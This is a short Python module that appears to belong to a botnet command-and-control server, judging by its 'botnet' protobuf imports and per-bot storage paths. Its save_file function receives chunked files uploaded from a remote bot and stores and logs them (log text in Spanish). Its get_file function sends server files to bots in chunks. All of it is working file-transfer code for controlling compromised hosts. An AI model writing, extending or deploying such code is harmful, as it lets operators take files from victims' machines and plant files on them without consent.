from server.modules import log
from server.modules.utils import files
from protos.botnet_pb2 import *
from protos.botnet_pb2_grpc import *

def save_file(chunks):
    data = b""
    bot = ""
    status = 0
    filename = ""
    c = 0
    for chunk in chunks:
        if c == 0:
            bot = chunk.bot_id
            filename = chunk.filename
            status = chunk.status
            if status == 0:
                break
        else:
            data += chunk.data
        c += 1
    if data == b"":
        log.add(f"./server/logs/bots/{bot}", bot, "DOWNLOAD", f"El fichero seleccionado no ha podido ser descargado del host remoto", "ERROR", protocol="HTTP/2")
    else:
        files.save_file(f"./server/files/bots/{bot}/{filename}", data)
        log.add(f"./server/logs/bots/{bot}", bot, "DOWNLOAD", f"El fichero {filename} se ha descargado desde el host remoto satisfactoriamente", "OK", protocol="HTTP/2")
    return Response(status="OK", type="ADMIN")

def get_file(request):
    array = []
    filename = files.get_file_name(request.file)
    if files.check_file(request.file):
        array.append(Chunk(bot_id=request.bot_id, status="OK", filename=filename, data=b""))
        for data in files.read_chunks(request.file):
            array.append(Chunk(bot_id=request.bot_id, status="OK", filename="", data=data))
    else:
        array.append(Chunk(bot_id=request.bot_id, status="MISSING", filename="", data=b""))
    return array